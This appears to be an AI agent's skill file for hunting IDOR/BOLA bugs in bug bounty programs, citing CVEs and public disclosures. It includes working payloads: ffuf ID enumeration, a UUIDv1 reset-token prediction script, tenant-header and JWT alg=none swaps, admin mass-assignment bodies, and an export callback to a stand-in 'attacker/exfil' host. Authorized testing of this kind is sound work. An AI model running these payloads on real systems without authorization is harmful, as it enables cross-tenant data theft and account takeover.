---
name: hunt-idor
description: Hunting skill for Insecure Direct Object Reference / Broken Object Level Authorization (BOLA — OWASP API1:2023). Built from 1,117 public IDOR bug bounty reports across HackerOne, Bugcrowd, Intigriti, GitHub Security Advisories, Huntr, plus 2024-2026 meta verified against NVD — Sam Curry's automotive chain (Kia/Hyundai/Ferrari), CVE-2026-30956 (OneUptime tenant header bypass CVSS 9.9), CVE-2025-64431 (Zitadel V2Beta Org API), CVE-2026-32131 (Zitadel Management API), CVE-2025-61876 (Inforcer tenant enumeration), CVE-2024-45719 (Apache Answer UUIDv1 token prediction), CVE-2024-50633 (Indico BOLA), plus the GraphQL field-level / nested-object pivot wave and agentic AI cross-tenant family (FastGPT, WeKnora, Paperclip). Use when hunting IDOR / BOLA / cross-tenant data access on web apps, APIs, GraphQL endpoints, multi-tenant SaaS, mobile apps, automotive/IoT platforms, and AI/ML inference servers.
sources: hackerone_public, github_advisories, github_deep, intigriti, huntr, project_zero, microsoft_msrc, bugcrowd, code4rena, immunefi, securitylab_github, nvd_verified
report_count: 1117
generated_at: 2026-05-04
---

## Deeper reference (load only if this specific situation applies)

This file covers the methodology and payloads that apply to almost every IDOR/BOLA
hunt. Three topics were moved out because they only apply under a specific
condition -- read the matching file ONLY when that condition is true for the
current target, never by default:

- **`references/niche-surfaces.md`** -- target is GraphQL, an AI/ML inference or
  agentic-LLM platform, a multi-tenant Kubernetes/cloud-IAM environment, or a
  supply-chain surface. Covers GraphQL IDOR (introspection/nested-pivot/mutation),
  AI/ML cross-tenant patterns, and the 2024-2026 expansion pack (container/K8s/
  cloud/supply-chain).
- **`references/source-code-review.md`** -- you have source/repo access (OSS bug,
  internal pentest, in-scope GitHub org). Semgrep/ast-grep/ripgrep/CodeQL patterns
  for finding IDOR statically; not useful for pure black-box hunting.
- **`references/chains-and-case-studies.md`** -- you already have one confirmed
  primitive and want to escalate it into a chain, or you want full narrative
  case studies (Kia, OneUptime, HackerOne GraphQL, Paperclip, Zitadel, Apache
  Answer) for report-framing inspiration. Not needed to find the first bug.

If the core methodology below does not resolve the hunt and the target matches
one of the conditions above, read the matching reference file before declaring
the surface exhausted.


## Crown Jewel Targets

IDOR (renamed BOLA in OWASP API1:2023) is the highest-frequency, second-highest-value bug class in modern bug bounty after RCE. ~40% of API attacks observed across production environments are BOLA per published research (Snyk 2026 Feb analysis). The 24-month meta has shifted decisively toward six asset types. All CVEs below are NVD-verified.

**1. Multi-tenant SaaS with client-supplied tenant context (CVSS 9.9 territory).** Every "send the tenant_id in the request" architecture is a candidate. **CVE-2026-30956** (OneUptime — `is-multi-tenant-query` header bypass + `projectid` header override → cross-tenant data exposure → reset token leak → ATO; GHSA-r5v6-2599-9g3m, CVSS 9.9 critical) is the canonical 2026 example. **CVE-2026-32131** (Zitadel Management API — low-priv `project.read` token reads other tenant's OIDC config; GHSA-wr6r-59xg-4pj2, affects 4.x through 4.12.1, 3.x through 3.4.7, 2.x through 2.71.19). **CVE-2025-64431** (Zitadel V2Beta Organization API — admin in Org A reads/modifies/deletes Org B; GHSA-cpf4-pmr4-w6cx, CVSS 8.7, fix in 4.6.3). Hunt header tenant injection on every multi-tenant target: `Tenantid`, `X-Org-Id`, `X-Tenant-ID`, `X-Project-Id`, `environmentId`, `is-multi-tenant-query`, `channel`. The OnSecurity disclosure ("How a single HTTP header unlocked every customer's data") documents the pattern in textbook form — `Tenantid: 3` to `Tenantid: 2` with no other change.

**2. Automotive / connected-vehicle platforms (six-figure-impact territory).** Sam Curry's pattern. **Kia 2024 disclosure** (samcurry.net/hacking-kia, Sep 2024) — dealer portal channel header manipulation → cross-account access → vehicle PII (name, phone, email, address) → silent secondary-user addition → remote unlock/start/track on any post-2013 Kia by license plate alone in 30 seconds. **Hyundai/Genesis/Honda/Nissan/Infiniti/Acura 2022-2023** (samcurry.net/web-hackers-vs-the-auto-industry) — same chain class against the entire auto industry. **Ferrari 2023** — full ATO + admin CMS access via IDOR on customer records + back-office endpoints. Hunt: dealer portals, fleet management APIs, telematics endpoints, OTA update orchestrators, EV charging networks. Bounties paid through automaker private programs and HackerOne IBB; impact framing pays mid-to-high five-figure when chained to physical vehicle control.

**3. GraphQL field-level / nested-object pivot (low-to-mid five-figure on enterprise SaaS).** GraphQL's resolver model means every field needs its own auth check, and most schemas miss them. **HackerOne $12,500 bounty Dec 2025** (Harshdranjan, documented by Monika Sharma writeup) — `certificationId` change in mutation deletes other users' Licenses & Certifications on hackerone.com itself. **$1,500 GraphQL field-level Feb 2026** (tinopreter Medium writeup) — `GetOrgWebhooks` query returns webhooks the user shouldn't see because field-level perms missing on `Project` accessed via `Organization` parent. **Yasser Hamoda April 2025 writeup** — unauthenticated GraphQL `user(username:"victim")` returns admin email/role with no auth. The pattern: any GraphQL endpoint where authentication is checked but field-level/object-level authorization isn't. Pivot endpoints: `me`, `user`, `organization`, `project`, `workflow`, `team`. Mutation IDOR (delete/update by ID) pays more than query IDOR.

**4. AI/ML platforms with cross-tenant model/data access.** New 2025-2026 surface, well-paying. **GHSA-3xx2-mqjm-hg9x (Paperclip Apr 2026, CVSS 10.0)** — board user in Company A mints agent API keys for any agent in Company B via `/agents/:id/keys`, then operates as that agent inside victim tenant — full cross-tenant compromise. **GHSA-gc8m-w37w-24hw (FastGPT)** — authenticated team accesses and executes any `appId` on `/api/v1/chat/completions` regardless of team ownership. **GHSA-2f4c-vrjq-rcgv (Tencent WeKnora)** — missing `tenant_id` WHERE clause in DB query tool exposes all tenants' API keys, model configs, private messages cross-tenant. The pattern: AI inference / agent management endpoints checking authentication but skipping tenant scoping.

**5. Government & enterprise legacy assets (DoD VDP through low five-figure on paid programs).** The H1 2024-2026 hacktivity is full of "IDOR exposes PII of tens of thousands" reports against forgotten asset surfaces. The 2026 Air Force candidate PII + recruitment chat logs disclosure (H1 critical) is a textbook example. Hunt: legacy CMS, candidate/recruitment portals, support ticket systems, file-upload migration endpoints, document-share systems.

**6. Apache Answer / Q&A / forum platforms with predictable token surface.** **CVE-2024-45719** (Apache Answer through 1.4.0, GHSA-mr95-vfcf-fx9p) — UUIDv1 timestamp-based tokens predict-by-arithmetic. The bananabr GitHub Security Lab disclosure (issue #816, paid via HackerOne #2513301 with linked bounty) introduced the CodeQL queries that catch this pattern systematically across JS/Python codebases. Hunt: any password reset, email confirmation, magic-link, or share-token implementation using UUIDv1 (timestamp-based) instead of UUIDv4 (random). The CodeQL query identifies sinks where `uuid.uuid1()` (Python) or `uuidv1()` (Node) flows into a token attribute — re-run against any in-scope OSS target.

**Financial APIs with per-account state IDOR.** Sri Sowmya Nemani Sep 2025 financial-services writeup — `account_number` parameter override returns other users' onboarding/funding state without PII but with regulatory-grade privacy violation. The pattern: any API where the account / customer identifier is in the request body or path and isn't checked against session ownership. Pays high four-figure to low five-figure on most fintech programs even without PII when state-disclosure has compliance implications (GDPR, GLBA, PCI).

**SCIM / IdP / IAM endpoints.** SCIM is a magnet for IDOR because the spec encourages identifier-driven update operations. **Keycloak SCIM PUT body ID override** (issue #46658, Feb 2026) — `ScimResourceTypeResource.update()` validates URL `{id}` exists, then calls `update()` with the body's `id` field, allowing path-vs-body mismatch attack to update any SCIM-managed resource. Hunt every SCIM `/Users/{id}` and `/Groups/{id}` PUT for path-body consistency.

**What pays the most:** unauthenticated cross-tenant data exposure (low-to-mid five-figure on enterprise SaaS); IDOR chained to ATO via leaked password reset tokens (mid five-figure when proven); admin-account IDOR on multi-tenant platforms (mid four-figure to low five-figure); destructive IDOR (delete/modify other users' resources, low five-figure on $12.5k HackerOne case); financial state IDOR (high four-figure to low five-figure on fintech programs even without PII). Account-state IDOR alone is generally low four-figure to mid four-figure unless chained.

## Attack Surface Signals

Greppable signals that this surface might exist:

```bash
# Sequential ID surface in URL paths (IDOR candidates)
rg -n '/(users?|orders?|invoices?|tickets?|files?|reports?|projects?|workflows?|certifications?|teams?|agents?)/[0-9]{1,8}\b' \
   --type js --type ts --type py --type go --type rb

# UUID v1 (timestamp-predictable, CVE-2024-45719 family) generation
rg -n 'uuid\.uuid1\(\)|uuidv1\(\)|UUID\.randomUUID\(\)\.toString\(\).*timestamp|UuidV1' \
   --type py --type js --type java

# Tenant context in headers / body (BOLA via header swap)
rg -n -i '(tenantid|tenant_id|tenant-id|x-org-id|x-tenant-id|x-project-id|environmentid|is-multi-tenant)' \
   --type js --type ts --type py --type go

# MongoDB queries missing organization filter (Novu pattern)
rg -n 'findOne\(\{[^}]*_id[^}]*\}' --type js --type ts | rg -v '_organizationId|_orgId|organization:'

# SQL queries missing tenant_id WHERE clause (WeKnora pattern)
rg -n 'SELECT.*FROM\s+\w+\s+WHERE\s+id\s*=' --type py --type java --type rb | rg -v 'tenant_id|org_id'

# GraphQL resolvers without context.user check (field-level auth missing)
rg -n -B 2 -A 8 '@ResolveField|resolveField|resolver.*\(.*\):' --type ts --type js | \
   rg -v 'context\.user|context\.auth|requireAuth|@AuthGuard'

# SCIM endpoints (path vs body ID mismatch — Keycloak issue #46658)
rg -n '/scim/v2/(Users|Groups)/' --type java --type js
rg -n 'ScimResource.*update' --type java

# Mass-assignment unsafe binding (BOLA's cousin)
rg -n 'request\.body|req\.body|@RequestBody' --type js --type ts --type java | rg -v 'pick\(|allowedFields|Allowlist|@JsonIgnore'
```

HTTP-level signals on a live target:

- Sequential numeric IDs in any path (`/api/v1/users/123`, `/orders/4532`) → **classic IDOR** — try ±1 enumeration first
- `Tenantid: 3`, `X-Org-Id: <id>`, `X-Tenant-ID:`, `X-Project-Id:`, `environmentId:` headers → **client-supplied tenant context** (OneUptime CVE-2026-30956 pattern; Novu GHSA-323c-xqcq-fpcp pattern) — swap value, replay
- `is-multi-tenant-query: true` header in any response trace → **CVE-2026-30956 OneUptime header bypass** — toggle and replay
- `channel:` request header on automotive / dealer portal traffic → **Sam Curry Kia 2024 chain** — modify channel header to bypass dealer-vs-customer permission tier
- GraphQL endpoint `/graphql` or `/api/graphql` reachable + introspection enabled → **GraphQL IDOR field-level surface** — enumerate types, look for `user(id:)` / `user(username:)` / `organization(id:)` queries
- POST/PUT/PATCH bodies containing both URL path identifier AND a body `id` field → **path-vs-body mismatch IDOR** (Keycloak SCIM #46658, very common in REST→DB ORM patterns)
- UUID v1 in any token (decode via tools.bytestream.com — first 60 bits are timestamp) → **CVE-2024-45719 family** — predict adjacent UUIDs by arithmetic
- `dealer.kia.com`, `connect.kia.com`, `dealer.honda.com`, `myhyundai.com`, automotive OEM dealer/connect domains → **Sam Curry pattern targets**
- Server header reveals `Apache Answer`, `Indico`, `Zitadel`, `OneUptime`, `Novu`, `FastGPT` → **specific NVD-verified IDOR CVE**
- `aws-region:` / `region:` body fields in inference / CDN APIs → **region-as-tenant** misconfig
- `403 Forbidden` for some objects of one type but `200 OK` for adjacent IDs of same type → **inconsistent authorization** = BOLA candidate
- GraphQL response with introspection schema present (`__schema`, `__type` in response) → **schema-discovery IDOR** — read schema, find sensitive fields, query directly
- SCIM endpoints `/scim/v2/Users/{id}` reachable with low-priv token → **Keycloak issue #46658 path-body override** — try PUT with mismatched body id

## Insertion Point Taxonomy

Every place attacker-controlled identifiers flow for IDOR/BOLA:

- **URL path** — `/users/<id>`, `/api/v2/workflows/<id>`, `/scim/v2/Users/<id>`. Most common. Try ±1, UUID swap from another response, null UUID `00000000-0000-0000-0000-000000000000`.
- **URL query** — `?id=`, `?user_id=`, `?account_number=`, `?environmentId=` (Novu CVE pattern), `?targetEnvironmentId=` (Novu PUT variant).
- **Custom headers** — `Tenantid`, `X-Org-Id`, `X-Project-Id`, `X-Tenant-ID`, `is-multi-tenant-query` (OneUptime), `channel` (Sam Curry Kia), `X-User-Id`, `X-Account-Id`, `aws-region` (region-as-tenant pattern).
- **Body fields** — `id`, `user_id`, `tenant_id`, `org_id`, `project_id`, `account_number`, `certificationId` (HackerOne $12.5k case), `appId` (FastGPT GHSA-gc8m-w37w-24hw), `environmentId` (Novu PUT body variant).
- **Body include/expand** — `include_tenants:["victim-corp"]`, `expand:["organization"]`, `relations:["other_user"]` — fields that opt into joined data without re-checking permission.
- **JWT claims** — `sub`, `tenant_id`, `org_id`, `roles[]`. Try claim swapping if signature verification is missing or weak. OnSecurity write-up on Tenantid header notes this as the proper fix the vendor missed: derive tenant from JWT claim, not request.
- **GraphQL variables** — `{user(id: $id)}`, `{organization(id: $id) {projects {id, sensitiveField}}}`. Field-level pivot via nested objects (tinopreter Feb 2026 case: query `Organization.project` instead of `Project` directly).
- **GraphQL nested object pivots** — when direct `project(id:)` is blocked, query `organization(id:) { projects { ... } }` because the org-level resolver doesn't re-check project permissions.
- **GraphQL field selection** — request `token`, `resetPasswordToken`, `permissions`, `email`, `internalNotes` fields on user objects you don't own (Yasser Hamoda 2025 case: requesting `role` field on `user(username:victim)`).
- **Cookies** — session-bound IDs (`tenant_session=acme-corp`), customer-id cookies, multi-tenant subdomain mappings.
- **WebSocket frames** — IDOR via JSON message handlers, often missed by HTTP-only review. Subscribe to other tenant's channel by sending crafted subscription frame.
- **Background/async paths** — export jobs, report generation, notification processing. Job queue entries often process without re-validating tenant context. Inject your job entry pointing at victim's data; the worker writes the output to your output bucket but reads from victim's data.
- **File paths in upload/download** — `/api/files/<id>/download`, `/uploads/<filename>`. If filename is sequential/predictable, IDOR. If filename is UUID, check UUID version.
- **SCIM resources** — `/scim/v2/Users/<id>` with body containing `id` — Keycloak issue #46658 path-body mismatch.
- **Inference / agent endpoints** (AI/ML targets) — `appId` (FastGPT), `agentId` (Paperclip), `modelId` (WeKnora). Include the victim's ID in the path/body and watch the response.

For each surface, send: your own ID, victim's ID, ID±1, null UUID, your ID with victim's `tenant_id` header, victim's ID with your `tenant_id` header. Watch for `200` instead of `403`.

## Step-by-Step Hunting Methodology

1. **Two accounts always.** IDOR hunting requires victim and attacker accounts in the target system. If the program is private and you can only have one account, focus on cross-tenant via header injection / unauthenticated endpoints. Without two accounts, you cannot prove most BOLA findings.

2. **Map the entire API surface.** Crawl JS bundles, Swagger/OpenAPI specs (`/swagger.json`, `/api/v1/openapi.json`, `/.well-known/openapi`), mobile app HTTPS traffic (Frida, mitmproxy on simulator), Postman collections. Look for endpoints the UI doesn't expose. The hidden endpoints are where IDOR lives because the hunters before you didn't see them.

3. **Identify all object identifier types.** For each endpoint, note: integer? UUID v4? UUID v1 (timestamp-predictable, CVE-2024-45719 family)? Slug? Encoded? Hash? UUID v1 → **immediate UUID prediction attack** (decode timestamp from first 60 bits, predict adjacent IDs). Sequential integer → enumeration attack. Slug → guess from public data (usernames, project names).

4. **Check tenant header surface first on multi-tenant targets.** If you see ANY of `Tenantid`, `X-Org-Id`, `X-Tenant-ID`, `X-Project-Id`, `environmentId`, `is-multi-tenant-query`, `channel` in request headers — your hunting starts there. Swap the value to another tenant ID (sequential? guess. UUID? get from another response or a friend's account). The OneUptime CVE-2026-30956 / Novu GHSA-323c-xqcq-fpcp / Sam Curry Kia chain all start at this step.

5. **Test every HTTP method on every endpoint.** GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS. The READ IDOR is mid four-figure; the DELETE IDOR is mid five-figure (HackerOne $12,500 GraphQL case was DELETE on certifications). The PATCH IDOR opens mass-assignment territory (BOLA's cousin).

5a. **Sweep EVERY id-bearing endpoint before you stop (Sibling Rule, `rules/hunting.md` Rule 8).** A confirmed IDOR on one object type does not clear the others — `users`, `orders`, `invoices`, `documents` are each an independent access-control decision. List every path/param carrying an object reference (id/uuid/slug/filename) and test EACH. The single most common way a clean-looking hunt leaves money on the table is finding the first IDOR and never testing the sibling object type.

6. **For GraphQL targets: introspect, then pivot through nested objects.** Send `{__schema { types { name fields { name } } }}` to enumerate. Find sensitive types (`User.email`, `User.role`, `User.token`, `Organization.apiKey`). For each, try direct query (`{user(id: <victim>) { email }}`) AND nested via parent (`{organization(id: <yours>) { users { email }}}`). The nested pivot usually works when the direct query is blocked because resolver auth is per-type, not per-field. Reference: $1,500 HackerOne disclosed Feb 2026 writeup at https://medium.com/@tinopreter/1-500-pii-leak-via-graphql-field-level-permission-bypass-1e7ea2d1a019, Yasser Hamoda April 2025 HackerOne disclosure.

7. **For mutations: change every ID in the body.** GraphQL mutations + REST PUT/PATCH/DELETE. If a mutation takes `certificationId: 123`, replay with `certificationId: 124` (HackerOne disclosed $12,500 case Dec 2025, Harshdranjan via medium.com/h7w writeup). Watch for `success` responses without permission errors.

8. **Path-body ID mismatch attack on REST.** When PUT/PATCH endpoints take both URL path id and body id, send mismatched values: `PUT /resources/MY_ID` with body `{"id": "VICTIM_ID", ...}`. The Keycloak SCIM issue #46658 (Feb 2026) is the textbook case — URL path validates existence, body id is what actually gets updated.

9. **JWT claim manipulation.** Decode the JWT, identify the tenant/role/sub claim, modify, re-encode. Three failure modes pay: (a) signature not verified at all (`alg: none`), (b) signature verified with attacker-known secret, (c) signature verified but claim isn't checked server-side (the `tenant_id` in JWT is decorative; server uses request header). The OnSecurity Tenantid disclosure documents (c) — the server should derive tenant from JWT but uses the request header.

10. **Mass assignment on PATCH/PUT.** Submit fields the UI doesn't show: `role`, `is_admin`, `is_verified`, `subscription_tier`, `credit_balance`, `permissions[]`, `tenant_id`. Check via subsequent GET — the mass-assigned field may stick even if the response doesn't show it.

11. **Background-job IDOR.** Find async paths (export, report-gen, notification, scheduled). Trigger an export job on victim's resource ID; worker may process without tenant scoping. Output lands in your bucket because writer uses your context, but reader uses the supplied resource id.

12. **AI/ML cross-tenant.** For inference/agent endpoints, supply victim's `appId` / `agentId` / `modelId`. Three failure modes: (a) auth checked, ownership skipped (FastGPT GHSA-gc8m-w37w-24hw); (b) cross-tenant key minting (Paperclip GHSA-3xx2-mqjm-hg9x — your call mints a key with victim's `companyId` claim); (c) DB query missing tenant filter on AI-data tables (Tencent WeKnora GHSA-2f4c-vrjq-rcgv — `models`, `messages`, `embeddings` not in tenant-isolation list).

13. **Validate before reporting.** Two accounts, two screenshots, both Burp request/response pairs side-by-side, redacted PII. Don't dump 100k records — the report needs ≤3 victim records to prove it (one is enough for most triagers). See Gate 0.

## Payload & Detection Patterns

### Sub-technique A — Sequential ID enumeration

```
# Direct path enumeration
GET /api/v1/users/1
GET /api/v1/users/2
...
# Use ffuf for fast brute force (auth header preserved)
ffuf -u https://target/api/v1/users/FUZZ -H "Authorization: Bearer <yours>" \
     -w /usr/share/wordlists/seclists/Fuzzing/numbers.txt -mc 200 -fs 0

# Burp Intruder cluster bomb on numeric ID
GET /api/v1/orders/§1§
Authorization: Bearer <yours>

# Compare responses by length
# Same length → likely 403/404; different length → likely 200 with other data
```

### Sub-technique B — UUID v1 timestamp prediction (CVE-2024-45719 family)

```python
# Decode UUIDv1 to extract timestamp + node
import uuid
u = uuid.UUID('your-uuid-here')
print(f"Version: {u.version}")  # 1 = timestamp-based, vulnerable
print(f"Time: {u.time}")  # 100ns intervals since 1582-10-15
print(f"Node: {u.node:012x}")  # MAC address of generator

# Predict adjacent UUIDs (target generated 1000 tokens/sec)
# Step 1: get a UUID for a known timestamp (e.g., trigger your own password reset)
your_uuid = uuid.UUID('xxxxxxxx-xxxx-1xxx-xxxx-xxxxxxxxxxxx')
your_time = your_uuid.time
your_node = your_uuid.node

# Step 2: generate UUIDs for nearby timestamps
import struct
predicted = []
for delta in range(-1000, 1001):  # 1000 ticks = 100us window
    t = your_time + delta
    # Construct UUIDv1 with same node, different timestamp
    time_low = t & 0xffffffff
    time_mid = (t >> 32) & 0xffff
    time_hi_version = ((t >> 48) & 0x0fff) | 0x1000
    clock_seq_hi_variant = 0x80  # variant bit
    clock_seq_low = 0x00
    fields = (time_low, time_mid, time_hi_version,
              clock_seq_hi_variant, clock_seq_low, your_node)
    predicted.append(str(uuid.UUID(fields=fields)))

# Step 3: try each predicted UUID against the password reset endpoint
# Reference: Apache Answer CVE-2024-45719, GHSA-mr95-vfcf-fx9p
# Reference: GitHub Security Lab issue #816 (bananabr) — CodeQL queries
```

### Sub-technique D — Multi-tenant header manipulation

```
# OneUptime pattern (CVE-2026-30956, GHSA-r5v6-2599-9g3m, CVSS 9.9)
POST /api/project/get-list
Authorization: Bearer <attacker_token>
projectid: <victim_project_uuid>
is-multi-tenant-query: true     # Toggle this — bypasses tenant scoping
content-type: application/json

{
  "query": {"_id": "<victim_project_uuid>"},
  "select": {"_id": true,
             "createdByUser": {"email": true,
                               "resetPasswordToken": true,
                               "password": true}}
}

# Sam Curry Kia 2024 dealer-portal pattern
GET /api/dealer/lookup
Authorization: Bearer <your_customer_token>
channel: dealer                  # Modify customer→dealer to gain dealer-tier access

# Generic tenant-id header swap (OnSecurity disclosure pattern)
GET /api/v1/customers
Authorization: Bearer <attacker_token>   # Unchanged
Tenantid: 2                              # Was 3, now 2 — entire victim tenant returned

# Tenant body injection (when header isn't there)
POST /api/v1/search
{
  "query": "invoice",
  "tenant_id": "victim-corp",            # Was "your-corp"
  "include_tenants": ["victim-corp"]     # Some APIs accept allowlist override
}

# environmentId override (Novu GHSA-323c-xqcq-fpcp)
GET /v2/workflows/<victim-workflow-id>?environmentId=<victim-env-id>
Authorization: Bearer <attacker-token>
# Server's findById uses _environmentId only, no _organizationId filter
```

### Sub-technique E — Body ID override (path-vs-body mismatch)

```
# Keycloak SCIM issue #46658 (Feb 2026) — universal pattern
PUT /scim/v2/Users/<MY_USER_UUID>
Content-Type: application/scim+json
Authorization: Bearer <my_scim_token>

{
  "id": "<VICTIM_USER_UUID>",     # Body ID overrides URL path ID
  "userName": "victim-modified",
  "emails": [{"value": "attacker@evil.com", "primary": true}]
}

# REST equivalent — common in Rails/Django/Express auto-binding apps
PUT /api/v1/users/<MY_USER_ID>
{
  "id": "<VICTIM_USER_ID>",       # Some ORMs prefer body id over path id
  "email": "attacker@evil.com"
}
```

### Sub-technique F — JWT claim swapping for IDOR

```bash
# Decode existing JWT
echo "eyJhbGciOiJIUzI1NiIs..." | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Common manipulable claims
# - sub: user identity (swap to victim's sub)
# - tenant_id / org_id: tenant context (swap to victim's tenant)
# - roles[]: add "admin" or "owner"
# - exp: extend expiry

# Three exploit paths:
# (a) alg=none — server doesn't verify signature
{
  "alg": "none",
  "typ": "JWT"
}
# Re-encode without signature: header.payload.

# (b) Weak HMAC secret — try jwt_tool with rockyou.txt
jwt_tool <token> -C -d /path/to/rockyou.txt

# (c) Server uses request header for tenant despite signed JWT (OnSecurity case)
# JWT has tenant_id=3 but server reads Tenantid: header — swap the header
```

### Sub-technique G — Mass assignment via PATCH (BOLA's cousin)

```
PATCH /api/v1/users/me
Content-Type: application/json
Authorization: Bearer <yours>

{
  "display_name": "Griffin",        # The field the UI shows
  "role": "admin",                  # Hidden field — privilege escalation
  "is_verified": true,
  "is_admin": true,
  "subscription_tier": "enterprise",
  "credit_balance": 99999,
  "permissions": ["delete_users", "change_roles"],
  "tenant_id": "victim-corp",       # Switch your tenant
  "owner_id": "<victim_user_uuid>"  # Some apps let you reassign ownership
}

# Verify via subsequent GET — mass-assigned fields may stick even if PATCH response hides them
GET /api/v1/users/me
```

### Sub-technique H — BOLA on background jobs / async paths

```
# Trigger an export job on victim's resource
POST /api/v1/exports
{
  "resource_id": "<victim_workflow_id>",   # Worker reads from this
  "format": "csv",
  "callback_url": "https://attacker/exfil"  # Output may go here if not validated
}

# Or inject into a job queue (when accessible)
POST /api/v1/jobs
{
  "type": "report_generation",
  "params": {
    "tenant_id": "victim-corp",
    "user_filter": null               # Process all users in victim tenant
  }
}

# Webhook-retry IDOR — register a webhook that fires on victim's events
POST /api/v1/webhooks
{
  "url": "https://attacker/",
  "events": ["*"],
  "scope": "<victim_tenant_id>"       # Some APIs accept scope override
}
```

### Out-of-band callback (for blind IDOR confirmation)

```
# When IDOR write triggers an email/notification to the victim, use a victim
# account you control; check inbox to confirm the cross-tenant write fired.
# When IDOR triggers async webhook to a victim-configured URL, register your
# own webhook and watch for the cross-tenant fire.
```

## Common Root Causes

Why developers introduce IDOR — patterns visible across the 1,117-report corpus plus the 2024-2026 meta:

1. **"Authentication ≠ authorization" — checking the token, not the ownership.** Most frequent root cause. Endpoint validates JWT signature and checks `iss`/`exp`, then trusts the request body's `id` field. Apache Answer, OneUptime, Zitadel, Novu, FastGPT, Paperclip, WeKnora — all this pattern.

2. **Client-supplied tenant context.** Tenant identity from `Tenantid` header, `tenant_id` cookie, `org` query param. Should always come from server-side derived JWT claim or session. OnSecurity Tenantid disclosure, OneUptime CVE-2026-30956 are the canonical examples.

3. **Path-vs-body identifier mismatch in REST/SCIM.** Handler validates URL path id exists, then ORM uses body id for the actual DB update. Keycloak SCIM issue #46658 (Feb 2026) is the textbook open case.

4. **GraphQL field-level auth missing.** Resolver checks "is user authenticated" at the type level but not "does user own this field" per-resolver. Especially bad for nested object access where parent resolver auth is checked but child's isn't. Tinopreter Feb 2026, Yasser Hamoda April 2025, Harshdranjan Dec 2025 cases.

5. **MongoDB / ORM `findById` without tenant filter.** Mongoose `findById(_id)` returns the document regardless of org. Same in Sequelize `findByPk`, Django `objects.get(pk=)`, Rails `find()`. Novu GHSA-323c-xqcq-fpcp explicitly. The fix is always to add `_organizationId` or equivalent to the query.

6. **UUIDv1 used for tokens.** Predictable timestamp-based generation for password reset, email confirmation, share links. CVE-2024-45719 Apache Answer family. The bananabr GitHub Security Lab CodeQL queries find this systematically.

7. **Mass-assignment unsafe binding.** Express/Rails/Django auto-bind request body to model. Attacker submits `role`, `is_admin`, `tenant_id`, `permissions[]` fields. The fix is explicit field allowlist (`pick()`, `permit()`, serializers).

8. **Sequential / predictable identifiers.** Auto-increment integer IDs in URLs. UUIDv1 in tokens. Hash-based IDs derived from predictable inputs (`md5(username)`). User-controlled "share token" parameters that aren't actually random.

9. **Cross-tenant background-job processing.** Job queue workers process entries without re-validating tenant context. Submit a job with victim's resource ID; worker reads victim's data and writes output to attacker-supplied location.

10. **Tool-use / agent endpoints skip ownership.** AI agent platforms — board user authentication checked, tenant scope skipped because "the agent has its own identity". Paperclip GHSA-3xx2-mqjm-hg9x: assertBoard passes, assertCompanyAccess skipped on three routes that other adjacent routes correctly check.

11. **Wildcard tenant scope from a config typo.** `tenants: "*"` or `tenant_id: null` in YAML config means "all tenants" in some frameworks. Look for these in IaC.

12. **SCIM provisioning with body trust.** SCIM PUT semantically overwrites the resource at the URL; if handler trusts body's id field, attacker overwrites foreign user.

## Bypass Techniques

Defense bypasses observed in disclosed reports. Each cites the source.

- **Tenant header swap when client-supplied** — replace `Tenantid: 3` with `Tenantid: 2`, keep your auth token. Documented in OnSecurity disclosure ("How a single HTTP header unlocked every customer's data") and OneUptime CVE-2026-30956 (GHSA-r5v6-2599-9g3m).
- **`is-multi-tenant-query: true` toggle** — bypasses tenant scoping entirely on OneUptime versions <10.0.21. CVE-2026-30956 NVD-verified.
- **Channel header tier escalation** — `channel: customer` → `channel: dealer` to gain dealer-portal access with customer token. Sam Curry samcurry.net/hacking-kia (Sep 2024), automotive industry pattern.
- **GraphQL nested-object pivot** — when `project(id: foreign)` is blocked, query `organization(id: yours) { projects { ... } }` to bypass per-type authorization. Documented at https://medium.com/@tinopreter/1-500-pii-leak-via-graphql-field-level-permission-bypass-1e7ea2d1a019 (@tinopreter HackerOne disclosed Feb 2026).
- **GraphQL field selection** — request `token`, `resetPasswordToken`, `permissions`, `role` fields on user objects you don't own. @yasser0hamoda1 disclosed 2025 writeup at https://medium.com/@yasser0hamoda1/unauthenticated-admin-profile-disclosure-via-graphql-idor-a-real-world-bug-bounty-find-f8647eae5237; HackerOne / GitHub Security Lab disclosure pattern.
- **GraphQL alias batching for rate-limit bypass** — submit 100 aliases per request (`u1: user(id:1) {email}, u2: user(id:2) {email}`) to enumerate without hitting rate limits. Documented at https://bugbounty.info/Attack-Surface/Web/Authorization/BOLA and across HackerOne GraphQL hacktivity disclosed 2024-2025.
- **Path-body ID override on PUT/PATCH** — URL path id passes auth check, body id is what ORM uses. @ahus1 Keycloak issue at https://github.com/keycloak/keycloak/issues/46658 (disclosed 2026).
- **Query parameter override of session context** — `?environmentId=victim` overrides the session's environmentId. Novu GHSA-323c-xqcq-fpcp.
- **Mass-assignment hidden fields on PATCH** — submit `role`, `is_admin`, `tenant_id`, `permissions[]` to mass-assign privilege. Documented at https://bugbounty.info/Attack-Surface/API/REST and across Atlassian/Shopify/GitHub hacktivity disclosed 2023-2024.
- **JWT claim swap when server uses request header** — JWT has `tenant_id: 1` but server reads `Tenantid:` header; modify the header. OnSecurity disclosure at https://onsecurity.io/article/pentest-files-how-a-single-http-header-unlocked-every-customers-data/ documents this as the "proper fix the vendor missed".
- **HTTP method swap** — endpoint's GET enforces auth, PUT/DELETE doesn't (REST OPTIONS reveals method list). Documented at https://bugbounty.info/Attack-Surface/API/REST and Bugcrowd LevelUp talks disclosed 2023-2024.
- **API version pivot** — `/api/v2/users/<id>` blocked, `/api/v1/users/<id>` returns the data because v1 was deprecated but not fully removed. Documented at https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization and across HackerOne API hacktivity disclosed 2024.
- **Mobile-app API endpoints** — endpoints exposed only to mobile clients sometimes have weaker auth. Frida/mitmproxy on simulator → discover hidden endpoints. Documented across HackerOne mobile-target hacktivity disclosed 2024-2026 (Shopify, GitLab, Vercel mobile programs).
- **UUIDv1 token prediction** — decode timestamp + node, predict adjacent UUIDs by arithmetic. Apache Answer CVE-2024-45719, GitHub Security Lab issue #816 (bananabr, paid HackerOne #2513301).
